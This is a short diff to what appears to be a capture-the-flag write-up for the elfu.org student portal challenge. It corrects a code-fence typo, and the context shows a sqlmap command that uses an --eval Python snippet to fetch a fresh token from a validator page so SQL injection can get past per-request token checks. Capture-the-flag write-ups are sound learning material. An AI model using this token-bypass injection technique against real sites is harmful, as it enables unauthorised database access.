@@ -2931,7 +2931,7 @@ b'MTAwOTg3OTQ3ODQwMTU3NzkzNjY4NTEwMDk4Nzk0Ny44NA==_MTI5MjY0NTczMjM1MjAzMjMxNjE0M
 
 Awesome, so we got that working. All that's left to do is incorporate this code into sqlmap, and execute it! Just note that since the urllib request is in bytes, we decode it in UTF-8.
 
-```consle
+```console
 root@kali:~/HH# sqlmap -u "https://studentportal.elfu.org/application-check.php?elfmail=test%40test.com&token=MTAwOTkxMTQ2MzA0MTU3Nzk4NjY2MTEwMDk5MTE0Ni4zMDQ%3D_MTI5MjY4NjY3MjY5MTIzMjMxNzE2NjgxLjcyOA%3D%3D" --eval="import urllib.request;import urllib.parse;page = urllib.request.urlopen('https://studentportal.elfu.org/validator.php');tk = (page.read()).decode('utf-8');token = tk" --dbms=mysql --level=3 --risk=3
         ___
        __H__
